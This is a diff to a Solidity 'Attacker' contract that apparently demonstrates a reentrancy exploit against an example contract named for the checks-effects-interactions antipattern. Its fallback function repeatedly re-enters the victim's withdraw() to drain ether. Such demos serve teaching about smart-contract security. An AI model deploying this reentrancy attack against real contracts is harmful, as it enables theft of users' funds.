@@ -5,6 +5,7 @@ import './ChecksEffectsInteractionsAntipattern.sol';
 contract Attacker {
   ChecksEffectsInteractionsAntipattern v;
   uint256 public count;
+  uint amount = 1 ether;
   address public victims_address;
 
   event LogFallback(uint c, uint balance);
@@ -15,20 +16,18 @@ contract Attacker {
   }
 
   function set_balance () public {
-    uint _amount;
-    _amount = 1 ether;
-     victims_address.call{value: _amount}("");
+     victims_address.call{value: amount}("");
   }
 
   function attack () public {
-    v.withdraw();
+    v.withdraw(amount);
   }
 
   fallback () external payable {
     count++;
     emit LogFallback(count, address(this).balance);
     if (count < 10) {
-      v.withdraw();
+      v.withdraw(amount);
     } 
   }
 }
